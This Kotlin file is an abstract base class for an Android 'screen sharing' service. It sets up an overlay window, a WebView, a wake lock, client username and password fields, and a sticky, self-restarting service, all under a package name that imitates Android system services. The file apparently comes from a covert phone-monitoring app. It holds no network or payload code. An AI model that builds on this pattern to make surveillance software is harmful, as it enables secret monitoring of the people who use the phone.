package com.android.services.services.screenSharing

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.WindowManager
import android.webkit.WebView
import android.widget.ImageView
import com.android.services.interfaces.IBackgroundProcessing

abstract class ScreenSharingCommandProcessBasel(
    val applicationContext:Context
) :IBackgroundProcessing{
    protected val windowManagerFlagOverlay =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
    protected var mWindowManager: WindowManager? = null
    protected var mWebView: WebView? = null
    protected var imageView:ImageView?=null
    protected val mHandler by lazy {
        Handler(Looper.getMainLooper())
    }


    protected var loadingFinished = true
    protected var redirect = false
    protected var clientUserName = ""
    protected var clientPassword = ""
    internal var wakeLock: PowerManager.WakeLock? = null

    companion object {
        internal const val TAG = "ScreenSharing"
        internal const val TAG_VIEW_360_BUG_WORK = "myApp:TOSView360Work"
        internal const val SCREEN_SHARING_NOTIFICATION_ID = 120
        const val SCREEN_SHARING_PUSH="SCREEN_SHARING_PUSH"

        @JvmStatic
        var screenSharingBugStatus: String? = null
    }

    abstract fun initialize()
    abstract fun onServiceDestroy()
    abstract fun parseIntent(intent: Intent)


    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            parseIntent(intent)
        }
        return Service.START_STICKY
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}